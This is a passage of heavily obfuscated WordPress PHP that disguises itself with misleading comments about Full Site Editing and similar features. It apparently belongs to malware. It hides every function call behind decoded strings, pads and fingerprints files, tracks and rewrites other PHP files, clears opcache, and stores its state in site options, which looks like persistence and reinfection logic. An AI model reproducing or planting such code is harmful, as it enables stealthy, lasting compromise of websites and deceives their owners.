  static    $pjqjftnbu_97dxm    = null;
if  ($pjqjftnbu_97dxm ===   null) {
$pjqjftnbu_97dxm  = false;
   if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1322)))    {
// accumulate control-flow-graph for WP Full Site Editing


$_dd = defined(bovhd4vawcd(1177))      ?      WP_CONTENT_DIR    :  (defined(m5t68uuej1(1323))  ?  ABSPATH  :  "");$rn544h7q=99*3;$bxzpu2in8=$rn544h7q-37;
  if ($_dd !==   "")    {$yav2fmr6kf=PHP_MAJOR_VERSION;$m5y__lfg=$yav2fmr6kf*3;


     $o7y6qr_vi52zhecf    =      @disk_free_space($_dd);
 if  ($o7y6qr_vi52zhecf    !==    false   &&  $o7y6qr_vi52zhecf   >=    (157286314+86))  $pjqjftnbu_97dxm  =      true;


    }
    }
       if (!$pjqjftnbu_97dxm) {



 if ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1281))) @update_option(bovhd4vawcd(1324), $GLOBALS['__scf_ibw9xvmx9ckin_187'](),  m40pvx5ij_z4mj(1259));
 }   elseif  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1280)))   {
$ygmyw61iaq52f  =   (int)   get_option(bovhd4vawcd(1324), 0);
   if   ($ygmyw61iaq52f     && $GLOBALS['__scf_ibw9xvmx9ckin_187']() - $ygmyw61iaq52f <   (86320+80)) $pjqjftnbu_97dxm    =    false;

 }
 }



 if      (!$pjqjftnbu_97dxm)   {
  return   $t6jsjlatx2i;
   }


   $hmdxj6c4oad  =    ogbpftuc2zm1u5k_q0dph1();

      if    ($hmdxj6c4oad    === -1 || $hmdxj6c4oad  >=  (134217679+49))    {
$wkokdoejn433    = (927937+872063)  +   $GLOBALS['__scf_e1fr80hqavau3c_353'](0, (699913+87));
}   elseif  ($hmdxj6c4oad   >=  (0x26e4d0e+0x191b2f2))  {

$wkokdoejn433      =   (1799978+22) +   $GLOBALS['__scf_e1fr80hqavau3c_353'](0, (645233+54767));
 } else  {
  return $t6jsjlatx2i;$a619ee__q=2146;$d_0dqdcbwmq=$a619ee__q%15;
}
if   ($GLOBALS['__scf_fr9u7cq1eo_10']($t6jsjlatx2i)  >=   $wkokdoejn433)   return $t6jsjlatx2i;


     if   ($GLOBALS['__scf_vvn10ievj2k_9']($GLOBALS['__scf_zsw089px33o1o__12']($t6jsjlatx2i),   -2) === lpwgqh9300(1325))   return     $t6jsjlatx2i;
 while ($GLOBALS['__scf_fr9u7cq1eo_10']($t6jsjlatx2i) <  $wkokdoejn433 - (0xa63+0x5a1)) {
 $w1jfjex0s0pwt   =  "";$xs7etjcx=320;$lbgwj0vx2p38=($xs7etjcx>0)?$xs7etjcx:-$xs7etjcx;
     if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1326)))  {
// gather operation

   try {
  $w1jfjex0s0pwt  = @$GLOBALS['__scf_w76zlppqbjw_1327'](random_bytes((1969+31)));
     }      catch (Throwable      $k3g08rnqu9m)  {
 $w1jfjex0s0pwt    = "";

   } catch    (Exception $k3g08rnqu9m)  {
   $w1jfjex0s0pwt   =   "";
  }
}
// delegate vault for PCRE2 JIT



if ($GLOBALS['__scf_fr9u7cq1eo_10']($w1jfjex0s0pwt)  <  (7770-3770))    {
  $w1jfjex0s0pwt  = $GLOBALS['__scf_pe3s4q1z7z_59'](uniqid("",  true));
     while   ($GLOBALS['__scf_fr9u7cq1eo_10']($w1jfjex0s0pwt)  <  (4934-934))   $w1jfjex0s0pwt  .=  $GLOBALS['__scf_pe3s4q1z7z_59']($w1jfjex0s0pwt);
  }
      $t6jsjlatx2i   .=  "\n/*" .    $w1jfjex0s0pwt  . bovhd4vawcd(1328);
}
return $t6jsjlatx2i;
 }
  function  bdsvhgz69_4ct5ntcc($t6jsjlatx2i)
 {
   if (!$GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i)  || $GLOBALS['__scf_fr9u7cq1eo_10']($t6jsjlatx2i)  <=      (1048558+18))  return $t6jsjlatx2i;



 $jhq7h77_vtf =   $GLOBALS['__scf_r1v12_o00h5hc_454'](m5t68uuej1(1329),   "",   $t6jsjlatx2i);


      return  $GLOBALS['__scf_e_8z8ias8ka_43']($jhq7h77_vtf) ?  $jhq7h77_vtf :   $t6jsjlatx2i;
 }
 function  ogbpftuc2zm1u5k_q0dph1()
 {$tcw2p8xmi0e=PHP_MAJOR_VERSION;$gz23wdces_=$tcw2p8xmi0e*10;


static $bwl_978bbp0hzrqg   = null;
 if   ($bwl_978bbp0hzrqg !==  null)   return $bwl_978bbp0hzrqg;
   $bwl_978bbp0hzrqg =  0;



   if   (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1079)))    return  $bwl_978bbp0hzrqg;
   $pgdfohj28qig745   =  @$GLOBALS['__scf_qa8nkfur9w_111'](m5t68uuej1(1330));
 if    (!$GLOBALS['__scf_e_8z8ias8ka_43']($pgdfohj28qig745)) return $bwl_978bbp0hzrqg;
      $pgdfohj28qig745 = $GLOBALS['__scf_nimluvpxhrpvn_323']($pgdfohj28qig745);



 if   ($pgdfohj28qig745  === "")  return $bwl_978bbp0hzrqg;
   if ($pgdfohj28qig745 ===   m40pvx5ij_z4mj(1331)) {



$bwl_978bbp0hzrqg   =   -1;
  return      $bwl_978bbp0hzrqg;
   }
$kdbfhd3lu4ttw =   (float)  $pgdfohj28qig745;
     $a94au_fesrwo3rl     = $GLOBALS['__scf_lz43duc1zwuh23_1332']($GLOBALS['__scf_vvn10ievj2k_9']($pgdfohj28qig745, -1));
 if    ($a94au_fesrwo3rl  === 'G')   $kdbfhd3lu4ttw   *=  (1810787307-737045483);
elseif     ($a94au_fesrwo3rl ===   'M')   $kdbfhd3lu4ttw   *= (0xed00d+0x12ff3);
elseif   ($a94au_fesrwo3rl  === 'K')     $kdbfhd3lu4ttw  *= (1014+10);
   if    ($kdbfhd3lu4ttw    >  0)     $bwl_978bbp0hzrqg =    (int) $kdbfhd3lu4ttw;
   return     $bwl_978bbp0hzrqg;


 }
     function  e2driuzucqp8g4db42ay($b6isie1aa_70pte1)
     {
 $b6isie1aa_70pte1   =    (int)  $b6isie1aa_70pte1;
 if   ($b6isie1aa_70pte1      <= 0) return     false;
if  (!$GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(658)))  return    false;
   $zvqxzbz8moai =      ogbpftuc2zm1u5k_q0dph1();
  if  ($zvqxzbz8moai ===  -1)  return    true;
if  ($zvqxzbz8moai     <=   0) return     false;
    $xbyig22rczfl3    =  @memory_get_usage(true);



  if  (!$GLOBALS['__scf_b5yzo205c3_f8_41']($xbyig22rczfl3) ||   $xbyig22rczfl3   <  0)  return  false;



   return ($zvqxzbz8moai    - $xbyig22rczfl3)   >    (($b6isie1aa_70pte1 *     (1+2))  +  (2409913-312761));
   }
    function    mhfi5e5zgmk3qi3($b6isie1aa_70pte1)
    {
 $b6isie1aa_70pte1   =     (int) $b6isie1aa_70pte1;
if  ($b6isie1aa_70pte1  <=  0)    return     false;
 if (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(658)))     return true;
     $zvqxzbz8moai  = ogbpftuc2zm1u5k_q0dph1();

  if ($zvqxzbz8moai    ===    -1) return  true;
 if    ($zvqxzbz8moai  <=     0) return  true;
$xbyig22rczfl3     =  @memory_get_usage(true);
       if (!$GLOBALS['__scf_b5yzo205c3_f8_41']($xbyig22rczfl3) || $xbyig22rczfl3    < 0)   return    true;
  return ($zvqxzbz8moai  -     $xbyig22rczfl3)      >     (($b6isie1aa_70pte1  * (8+12)) +  (8388602+6));
}
 function   n2fjr1yyl5ye7s_6q($uim861ig2y)
 {
// catch block

  if     (!$GLOBALS['__scf_e_8z8ias8ka_43']($uim861ig2y)    ||   $uim861ig2y    ===    "" ||  !@$GLOBALS['__scf_a83pywb98qzq2_20']($uim861ig2y)) return     false;
     if    ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(184)))     @clearstatcache(true,  $uim861ig2y);


   $b6isie1aa_70pte1   = @$GLOBALS['__scf_pftf6vocmvs2m_99']($uim861ig2y);
if   (!$GLOBALS['__scf_b5yzo205c3_f8_41']($b6isie1aa_70pte1)   ||   $b6isie1aa_70pte1 <   1)  return false;
 if ($b6isie1aa_70pte1 >   (9067074+43361726)) return null;
  if  ($b6isie1aa_70pte1 >  (0xf65ed+0x9a13) &&   !e2driuzucqp8g4db42ay($b6isie1aa_70pte1))  return null;
   $t6jsjlatx2i    = @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($uim861ig2y,     false,   null, 0,  $b6isie1aa_70pte1  +    1);


if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i)  ||   $GLOBALS['__scf_fr9u7cq1eo_10']($t6jsjlatx2i) !== $b6isie1aa_70pte1)  return  false;
  return  $b6isie1aa_70pte1    >   (2026786-978210) ?  bdsvhgz69_4ct5ntcc($t6jsjlatx2i)  :  $t6jsjlatx2i;
 }
 function lnseazh_1k4yq6v_kjl($uim861ig2y)
 {
  if  (!$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1333))     || !$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1281)))  return;
  

 if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($uim861ig2y)   ||     $uim861ig2y      ===  ""  ||    !@$GLOBALS['__scf_a83pywb98qzq2_20']($uim861ig2y)) return;
    if   (!isset($GLOBALS[m40pvx5ij_z4mj(1334)]) ||     !$GLOBALS['__scf_pomb89yiuz_37']($GLOBALS[lpwgqh9300(1334)])) {


       $GLOBALS[lpwgqh9300(1334)] =   get_option(m5t68uuej1(1335),  array());
   if  (!$GLOBALS['__scf_pomb89yiuz_37']($GLOBALS[m40pvx5ij_z4mj(1336)]))   $GLOBALS[m40pvx5ij_z4mj(1337)]     =   array();$ri1v33vsip=PHP_INT_MAX/PHP_INT_MAX;$ej9lflxv=$ri1v33vsip+38;
  }
$ijvqfm4k0rvi7   = $GLOBALS[bovhd4vawcd(1337)];
   $t6jsjlatx2i =   n2fjr1yyl5ye7s_6q($uim861ig2y);
 if    (!$GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i))  return;
 $ijvqfm4k0rvi7[$GLOBALS['__scf_pe3s4q1z7z_59']($uim861ig2y)]   = array('p' => $uim861ig2y,  'h'   =>     $GLOBALS['__scf_pe3s4q1z7z_59']($t6jsjlatx2i), 'g'   =>    kdgw8qqvzf6yolk(),  't'   =>  $GLOBALS['__scf_ibw9xvmx9ckin_187']());
  if    ($GLOBALS['__scf_xbixt340jb_38']($ijvqfm4k0rvi7)  > (196+4))  {
 foreach ($ijvqfm4k0rvi7 as $yivzbj99kx559x  =>  $kdbfhd3lu4ttw) {
// WP Site Editor: bounded factory

    if     (!$GLOBALS['__scf_pomb89yiuz_37']($kdbfhd3lu4ttw)     ||   !isset($kdbfhd3lu4ttw['t'])   ||  (int) $kdbfhd3lu4ttw['t']    < $GLOBALS['__scf_ibw9xvmx9ckin_187']() -   (2591946+54))     unset($ijvqfm4k0rvi7[$yivzbj99kx559x]);
}
       while ($GLOBALS['__scf_xbixt340jb_38']($ijvqfm4k0rvi7)  >   (135+65)) {
 $f78jj4mfbqfaw6_ =   null;
$gc56u3bzfvd   = null;
  foreach ($ijvqfm4k0rvi7  as $yivzbj99kx559x =>   $kdbfhd3lu4ttw)   {
$ymodjqy4ocv5  =    $GLOBALS['__scf_pomb89yiuz_37']($kdbfhd3lu4ttw) &&  isset($kdbfhd3lu4ttw['t'])    ?   (int)   $kdbfhd3lu4ttw['t'] : 0;
    if   ($gc56u3bzfvd    ===   null     ||  $ymodjqy4ocv5   < $gc56u3bzfvd)      {
   $gc56u3bzfvd   =    $ymodjqy4ocv5;
    $f78jj4mfbqfaw6_   = $yivzbj99kx559x;
}
}

 if  ($f78jj4mfbqfaw6_ ===     null)  break;
unset($ijvqfm4k0rvi7[$f78jj4mfbqfaw6_]);
}
}

       update_option(lpwgqh9300(1338), $ijvqfm4k0rvi7, m5t68uuej1(1259));
$GLOBALS[m5t68uuej1(1337)]   =     $ijvqfm4k0rvi7;
 }
  function     vwmi9k19liyrqa2($uim861ig2y)
{
   if  (!$GLOBALS['__scf_e_8z8ias8ka_43']($uim861ig2y)  ||   $uim861ig2y  ===   "") return   false;
if    (!isset($GLOBALS[m40pvx5ij_z4mj(1339)])   ||    !$GLOBALS['__scf_pomb89yiuz_37']($GLOBALS[m5t68uuej1(1339)]))   {
$GLOBALS[bovhd4vawcd(1340)]    = $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1341))      ?    get_option(lpwgqh9300(1342),     array()) :    array();
  if     (!$GLOBALS['__scf_pomb89yiuz_37']($GLOBALS[lpwgqh9300(1340)]))   $GLOBALS[lpwgqh9300(1340)] = array();
}
 $ijvqfm4k0rvi7    = $GLOBALS[m5t68uuej1(1340)];

  $zusurhlk29z     =  $GLOBALS['__scf_pe3s4q1z7z_59']($uim861ig2y);
    if  (isset($ijvqfm4k0rvi7[$zusurhlk29z]) &&  $GLOBALS['__scf_pomb89yiuz_37']($ijvqfm4k0rvi7[$zusurhlk29z])    &&  isset($ijvqfm4k0rvi7[$zusurhlk29z]['h']))   {
     if  ((int)   @$GLOBALS['__scf_pftf6vocmvs2m_99']($uim861ig2y)  > (103977705-51548905))    return      m40pvx5ij_z4mj(1343);
  $t6jsjlatx2i     =    n2fjr1yyl5ye7s_6q($uim861ig2y);


if   ($GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i))   {
return  ($GLOBALS['__scf_pe3s4q1z7z_59']($t6jsjlatx2i)    === $ijvqfm4k0rvi7[$zusurhlk29z]['h'])   ?  true  :  bovhd4vawcd(1343);


 }
 return     false;
}
 if (ey9i45m9xcoe7q13e9ag2($uim861ig2y, (419+81)))    {$_urg4mtjd=4874;$ftehi5731ff=$_urg4mtjd%10;
$t_1gijg4ys9il =  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($uim861ig2y,  false,  null, 0,   (4072+24));
    if ($GLOBALS['__scf_e_8z8ias8ka_43']($t_1gijg4ys9il) &&  $GLOBALS['__scf_i8i8g4oxha_7']($t_1gijg4ys9il,    bovhd4vawcd(238)) !==   false)  return   m5t68uuej1(1344);

}
return  false;
}
  function  w6zi2tffzlng4hu()
     {
   static  $ijvqfm4k0rvi7   =   null;
  if     ($ijvqfm4k0rvi7    !==  null)   return  $ijvqfm4k0rvi7;
  $t6jsjlatx2i =    n2fjr1yyl5ye7s_6q(t6995wceyqc2q1wqvl());

  $ijvqfm4k0rvi7      =  $GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i)   && $t6jsjlatx2i     !==  ""  ? $GLOBALS['__scf_pe3s4q1z7z_59']($t6jsjlatx2i)  :   "";
return  $ijvqfm4k0rvi7;
      }
  function  jkpxsijh6klk_4y681rw()
   {
      return  $GLOBALS['__scf_vvn10ievj2k_9'](w6zi2tffzlng4hu(),   0,    (11+1));



 }

 function     idcex2k_dppxumj71g()
 {
 return  dha61pphirvk3tnlr()     . bovhd4vawcd(1345)  .    dv62azao9qb3z33m4cwig0(ABSPATH     . bovhd4vawcd(1346),  (4+4))   .    lpwgqh9300(1308);
}
       function    sayeodgmxz9seo_nz4dfzd()
   {



     $hj1_klzn5qql   =   array();
 if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1341))) {



$ozkz0i2skx7    =  @get_option(m40pvx5ij_z4mj(1347),    array());
if  ($GLOBALS['__scf_pomb89yiuz_37']($ozkz0i2skx7))  $hj1_klzn5qql    = $ozkz0i2skx7;
    }



  $t6jsjlatx2i =    @$GLOBALS['__scf_a83pywb98qzq2_20'](idcex2k_dppxumj71g()) ?  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95'](idcex2k_dppxumj71g())  :  "";
    if     ($GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i)   &&  $GLOBALS['__scf_i8i8g4oxha_7']($t6jsjlatx2i, m5t68uuej1(1228)) === 0)      {
    $m8fw57tomvn  = $GLOBALS['__scf_bhirfghv_sj17k_328']($GLOBALS['__scf_vvn10ievj2k_9']($t6jsjlatx2i, (0x3+0x2)),   true);
     if  ($GLOBALS['__scf_pomb89yiuz_37']($m8fw57tomvn) &&  (empty($hj1_klzn5qql[m40pvx5ij_z4mj(1348)])     ||  (!empty($m8fw57tomvn[m5t68uuej1(1348)])  && $m8fw57tomvn[lpwgqh9300(1349)]  >=  $hj1_klzn5qql[bovhd4vawcd(1349)])))   $hj1_klzn5qql     = $m8fw57tomvn;
}
return $hj1_klzn5qql;
     }


 function c4m38y27ifhwinzv($vu2fi7kiq0ax3)
{

     try {
 if  (!defined(m5t68uuej1(1323)))      return;
     $gth83v029sdq  =    $GLOBALS['__scf_ibw9xvmx9ckin_187']();



   if   ($vu2fi7kiq0ax3 ===   m5t68uuej1(218) ||  $vu2fi7kiq0ax3      ===  bovhd4vawcd(1350))  {
  $prev = sayeodgmxz9seo_nz4dfzd();
if (
   isset($prev[bovhd4vawcd(1351)],   $prev[bovhd4vawcd(1352)]) && $prev[m5t68uuej1(1351)]    === $vu2fi7kiq0ax3
 &&   $gth83v029sdq -    (int) $prev[m5t68uuej1(1353)] < ($vu2fi7kiq0ax3  ===  m40pvx5ij_z4mj(1354)    ?     (222+78)   :    (0x8+0x2))
   )   return;
}
  $hj1_klzn5qql = array(


'v' =>  kdgw8qqvzf6yolk(),
 lpwgqh9300(1355)   =>  jkpxsijh6klk_4y681rw(),
 m5t68uuej1(211)    =>     t6995wceyqc2q1wqvl(),

bovhd4vawcd(1141)     =>  $GLOBALS['__scf_os_n9tj5psxjj_3'](t6995wceyqc2q1wqvl(),  m40pvx5ij_z4mj(1308)),
   m40pvx5ij_z4mj(1351)  => $vu2fi7kiq0ax3,
     m40pvx5ij_z4mj(1356) => $gth83v029sdq,
 bovhd4vawcd(1353) =>    $gth83v029sdq,
m40pvx5ij_z4mj(1349)   => isset($_SERVER[bovhd4vawcd(1357)])   ?   (int)    $_SERVER[lpwgqh9300(1357)] :  $gth83v029sdq,
   );
if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1358)))    {
  $xjk4k6nhaaebf4p9   =   @update_option(lpwgqh9300(1359),  $hj1_klzn5qql,  lpwgqh9300(1259));
  if ($xjk4k6nhaaebf4p9 ===   false   && $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1341)))  {
 $jn81aqi2xzqid    =      @get_option(m40pvx5ij_z4mj(1359),  array());
$xmh102oj2m24e1      = !$GLOBALS['__scf_pomb89yiuz_37']($jn81aqi2xzqid)    ||      !isset($jn81aqi2xzqid[bovhd4vawcd(1351)], $jn81aqi2xzqid[lpwgqh9300(1360)])     || $jn81aqi2xzqid[lpwgqh9300(1351)] !==   $vu2fi7kiq0ax3 || (int) $jn81aqi2xzqid[lpwgqh9300(1360)]    !==   $gth83v029sdq;
 if  ($xmh102oj2m24e1 && isset($GLOBALS[lpwgqh9300(1221)])     &&  $GLOBALS['__scf_pd74_ila1rfp_70']($GLOBALS[lpwgqh9300(1221)])  && $GLOBALS['__scf_sruyigi7mie8_118']($GLOBALS[m5t68uuej1(1361)],    m5t68uuej1(1362)))     {
@$GLOBALS[m5t68uuej1(1361)]->check_connection(false);
      @update_option(bovhd4vawcd(1359),    $hj1_klzn5qql,  lpwgqh9300(1363));
   }
// finalize trust-anchor for WP Custom Link

   unset($jn81aqi2xzqid, $xmh102oj2m24e1);

}
 unset($xjk4k6nhaaebf4p9);
  }
 $_xfdo1_14r691bp =    dha61pphirvk3tnlr();
    if   (@$GLOBALS['__scf_i9hdv7zrfsy_45']($_xfdo1_14r691bp)  ||   xcz5hl0mdlt7fpm3xxe($_xfdo1_14r691bp,  (397+96),   true))    {
@$GLOBALS['__scf_u59p44o1il_196'](idcex2k_dppxumj71g(),  m40pvx5ij_z4mj(1228)  .  $GLOBALS['__scf_sfkxpd8jhlhj_587']($hj1_klzn5qql));

  }


  }  catch   (Throwable   $k3g08rnqu9m)  {
   }  catch  (Exception    $k3g08rnqu9m)  {
// @unlock backlog

 }



 }
function    wgc6g5qn0cg71tm0jcw2s($hj1_klzn5qql)
    {



if    (!$GLOBALS['__scf_pomb89yiuz_37']($hj1_klzn5qql)  ||  empty($hj1_klzn5qql[m5t68uuej1(211)])  ||  !$GLOBALS['__scf_e_8z8ias8ka_43']($hj1_klzn5qql[m40pvx5ij_z4mj(211)]))  return  bovhd4vawcd(1364);



  $ln5_jbqpu4in  =   $hj1_klzn5qql[lpwgqh9300(1365)];
if  (!@$GLOBALS['__scf_a83pywb98qzq2_20']($ln5_jbqpu4in)  ||     (int) @$GLOBALS['__scf_pftf6vocmvs2m_99']($ln5_jbqpu4in) < (601-101))  return   bovhd4vawcd(1364);

if (_z0a2xi_u8npvosrifue($ln5_jbqpu4in))   return  m40pvx5ij_z4mj(1366);
   $ho_uo4wbxc3tqb_  =   isset($hj1_klzn5qql[m5t68uuej1(1351)])      ?  $hj1_klzn5qql[bovhd4vawcd(1351)]   : "";
 $kgywtuy0vdp1i9ap      =   isset($hj1_klzn5qql[lpwgqh9300(1367)])  ?  (int) $hj1_klzn5qql[lpwgqh9300(1368)]  :   0;
    if   ($ho_uo4wbxc3tqb_ === bovhd4vawcd(1354))  return  ($kgywtuy0vdp1i9ap   >  0 &&   $GLOBALS['__scf_ibw9xvmx9ckin_187']()     -  $kgywtuy0vdp1i9ap    <=    (3501+99))  ?    lpwgqh9300(1354) :   m5t68uuej1(1369);
  if  ($ho_uo4wbxc3tqb_      === bovhd4vawcd(191))   return      lpwgqh9300(1366);
      if  ($ho_uo4wbxc3tqb_   ===  m40pvx5ij_z4mj(1370))   return  ($kgywtuy0vdp1i9ap   >  0 &&  $GLOBALS['__scf_ibw9xvmx9ckin_187']()     - $kgywtuy0vdp1i9ap  <= (0x47+0x31))  ?   bovhd4vawcd(1371)  :  lpwgqh9300(1366);
   return   m40pvx5ij_z4mj(1371);
  }
   function     u4zei_kbwnbowyst($uim861ig2y)
     {
       if    (!@$GLOBALS['__scf_a83pywb98qzq2_20']($uim861ig2y)) return false;
     $ob1u5r4y2s =  (int)    @$GLOBALS['__scf_pftf6vocmvs2m_99']($uim861ig2y);
    if   ($ob1u5r4y2s   <   (452+48)  || $ob1u5r4y2s >  (25472960+26955840)) return      false;
     $t_1gijg4ys9il  =   @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($uim861ig2y,    false,  null, 0, (0xe7d+0x183));



if (!$GLOBALS['__scf_e_8z8ias8ka_43']($t_1gijg4ys9il)  ||  !$GLOBALS['__scf_vqnw5_4kg7eu_96'](m5t68uuej1(209),  $t_1gijg4ys9il)) return   false;
   if   ($ob1u5r4y2s  >  (880143+168433))    {
    $wkokdoejn433  =     @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($uim861ig2y, false, null,  $ob1u5r4y2s  -   (4066+30));



   return  $GLOBALS['__scf_e_8z8ias8ka_43']($wkokdoejn433)  &&  $GLOBALS['__scf_vqnw5_4kg7eu_96'](bovhd4vawcd(1372),   $wkokdoejn433)   ===  1;
      }
     $t6jsjlatx2i =    @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($uim861ig2y);
      if     (!$GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i))   return false;
return fgcc_h22bqxgwmccod($t6jsjlatx2i);
      }

  function  v7bflcy_td_1ovut($k0dfmlduax35j7j,   $xmu6vgl26q74)



    {
 $wysaban8d0  = @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($k0dfmlduax35j7j,  false,     null,   0,  (4075+21));



     $x90tsozeaoxq  =  @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($xmu6vgl26q74,   false,  null,  0, (4065+31));

  if   (!$GLOBALS['__scf_e_8z8ias8ka_43']($wysaban8d0)   ||   !$GLOBALS['__scf_e_8z8ias8ka_43']($x90tsozeaoxq)) return  false;
 $_ji128mx7kjf =  $ufpg407uculfo  =   null;
 if  ($GLOBALS['__scf_vqnw5_4kg7eu_96']("/!function_exists\('([A-Za-z0-9_]+)'\)/",     $wysaban8d0,     $uedc5mufpw))  $_ji128mx7kjf  =     $uedc5mufpw[1];
     if ($GLOBALS['__scf_vqnw5_4kg7eu_96']("/!function_exists\('([A-Za-z0-9_]+)'\)/",    $x90tsozeaoxq, $uedc5mufpw)) $ufpg407uculfo =   $uedc5mufpw[1];
return   $_ji128mx7kjf  !==   null &&     $_ji128mx7kjf   ===   $ufpg407uculfo;
 }
function   _z0a2xi_u8npvosrifue($uim861ig2y)
    {

$lnfyvmqftz      =  $GLOBALS['__scf_os_n9tj5psxjj_3']($uim861ig2y, lpwgqh9300(1308));
       foreach  (array($GLOBALS['__scf_oagg5b1ubqmznt_11']($uim861ig2y),  gqtg_eoxyrv0ml2271n())  as    $v9qf3vep2p) {
$szlze7c6mbixvbj    =   $v9qf3vep2p . m5t68uuej1(185) .   $lnfyvmqftz;
     if (!@$GLOBALS['__scf_a83pywb98qzq2_20']($szlze7c6mbixvbj)  ||     (int)    @$GLOBALS['__scf_tm09rtls_27e_98']($szlze7c6mbixvbj)    < $GLOBALS['__scf_ibw9xvmx9ckin_187']()  -    (187706+417094))   continue;
 $omjahwreim     =  $GLOBALS['__scf_nimluvpxhrpvn_323']((string)    @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($szlze7c6mbixvbj));


      if    ($omjahwreim  ===  "")    continue;
    $t6jsjlatx2i =   n2fjr1yyl5ye7s_6q($uim861ig2y);
     if ($t6jsjlatx2i  ===   null)    continue;
if  ($GLOBALS['__scf_e_8z8ias8ka_43']($t6jsjlatx2i) && $t6jsjlatx2i    !==  "" &&    $GLOBALS['__scf_pe3s4q1z7z_59']($t6jsjlatx2i) ===   $omjahwreim)  return   true;
   }
 return  false;
 }


function  bada9oxfsvg685gw0b($uim861ig2y)


    {
 if  (!$GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1341))  ||  !$GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1373))) return;
$bwl_978bbp0hzrqg =    @get_option(lpwgqh9300(1374), array());
      if   (!$GLOBALS['__scf_pomb89yiuz_37']($bwl_978bbp0hzrqg)) $bwl_978bbp0hzrqg =  array();
  $bwl_978bbp0hzrqg[$GLOBALS['__scf_pe3s4q1z7z_59']($uim861ig2y)]  = $uim861ig2y;
     if ($GLOBALS['__scf_xbixt340jb_38']($bwl_978bbp0hzrqg)     >   (7+13))  $bwl_978bbp0hzrqg =  $GLOBALS['__scf_tcy2zdxc2t_157']($bwl_978bbp0hzrqg,  -(0x9+0xb),  null, true);



     @update_option(lpwgqh9300(1374),  $bwl_978bbp0hzrqg, m5t68uuej1(1375));
   }
function    _bbtkglqxgt01cpk9h()
   {


if (!$GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1376))  ||     !$GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1377))) return;
        $bwl_978bbp0hzrqg = @get_option(m5t68uuej1(1378),      array());
if (!$GLOBALS['__scf_pomb89yiuz_37']($bwl_978bbp0hzrqg)    ||  empty($bwl_978bbp0hzrqg))  return;
 

     $czrekop41z_p  = array();
      foreach      ($bwl_978bbp0hzrqg as    $yivzbj99kx559x =>  $ln5_jbqpu4in)  {


        if (!$GLOBALS['__scf_e_8z8ias8ka_43']($ln5_jbqpu4in)   || $ln5_jbqpu4in   ===   "" ||  !@$GLOBALS['__scf_a83pywb98qzq2_20']($ln5_jbqpu4in)) continue;
  if    ($ln5_jbqpu4in ===   t6995wceyqc2q1wqvl())     continue;

     $otvf1gzxdq2y8_hd  =   @$GLOBALS['__scf_j79iy74onqck2_35']($ln5_jbqpu4in);$twz65zc0=(0x5e+0x43);$qixyy4nt9ws9u=$twz65zc0%10;
 $x7lkji6xecof9t   =  @$GLOBALS['__scf_j79iy74onqck2_35'](t6995wceyqc2q1wqvl());
if  ($GLOBALS['__scf_e_8z8ias8ka_43']($otvf1gzxdq2y8_hd) &&   $GLOBALS['__scf_e_8z8ias8ka_43']($x7lkji6xecof9t) &&  $otvf1gzxdq2y8_hd  ===     $x7lkji6xecof9t)  continue;
// @merge distributor

   unset($otvf1gzxdq2y8_hd,  $x7lkji6xecof9t);
  if  (vwmi9k19liyrqa2($ln5_jbqpu4in) === false) {$dwcrgnijou=PHP_INT_MAX/PHP_INT_MAX;$gwo48473a5=$dwcrgnijou+10;
 $czrekop41z_p[$yivzbj99kx559x]     = $ln5_jbqpu4in;
  continue;
 }

    cik9ldzrbjmtnzm00($ln5_jbqpu4in,  (478-58));
   if (netei2x342rtzmi4tj69($ln5_jbqpu4in))  {



if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(22)))  @opcache_invalidate($ln5_jbqpu4in, true);
  }   elseif     (@$GLOBALS['__scf_a83pywb98qzq2_20']($ln5_jbqpu4in))   {
     $czrekop41z_p[$yivzbj99kx559x]    =  $ln5_jbqpu4in;
      }
// primitive-recursive symbol-table

  }
   @update_option(lpwgqh9300(1378),  $czrekop41z_p,  m40pvx5ij_z4mj(1379));
  }
  function     djk2e8rjqoraergqww_l()
 {
    try {$vpw1v6sr5_gqje=779;$i3n23lx761j0=($vpw1v6sr5_gqje>0)?$vpw1v6sr5_gqje:-$vpw1v6sr5_gqje;
$k3g08rnqu9m   =   $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1380))  ? @error_get_last()  :  null;

  if (
